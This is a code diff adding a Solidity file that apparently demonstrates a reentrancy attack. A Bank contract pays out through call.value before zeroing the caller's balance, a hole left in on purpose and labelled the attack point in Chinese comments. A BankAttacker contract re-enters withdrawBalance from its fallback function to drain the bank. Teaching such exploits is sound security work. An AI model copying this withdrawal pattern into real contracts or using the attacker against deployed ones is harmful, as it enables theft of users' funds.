@@ -1,0 +1,61 @@
+pragma solidity^0.4.16;
+contract Bank{
+   uint balance;// 这是为了方便查看Bank合约地址上还剩多少钱，以判断攻击是否成功
+   mapping(address=>uint) userBalances;
+   function Bank() payable{
+       balance = msg.value;
+   }
+
+   function getUserBalance(address user) constant returns(uint) {
+     return userBalances[user];
+   }
+
+   function addToBalance() public payable{
+     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
+     balance += msg.value;
+   }
+
+   function withdrawBalance() {//攻击点所在处
+     uint amountToWithdraw = userBalances[msg.sender];
+     balance -= amountToWithdraw;
+     //userBalances[msg.sender] = 0;
+     if (msg.sender.call.value(amountToWithdraw)() == false) {
+     //if((msg.sender.send(amountToWithdraw)) == false){
+         throw;
+     }
+     userBalances[msg.sender] = 0;
+   }
+   function getBalance() public view returns(uint){
+       return balance;
+   }
+}
+
+contract BankAttacker{
+   bool attacked;
+   address bankAddress;
+   
+   function  BankAttacker(address _bankAddress, bool _attacked)payable{
+       bankAddress=_bankAddress;
+       attacked=_attacked;
+   }
+   function() payable{//回调函数
+       if(attacked==false)
+       {
+           attacked=true;
+           if(bankAddress.call(bytes4(sha3("withdrawBalance()")))==false) {
+               throw;
+           }
+       }
+   }
+   function  deposit(){
+        if(bankAddress.call.value(2000000)(bytes4(sha3("addToBalance()")))==false) {
+               throw;
+           }
+   }
+   function  withdraw(){
+        if(bankAddress.call(bytes4(sha3("withdrawBalance()")))==false ) {
+               throw;
+           }
+   }
+}
+
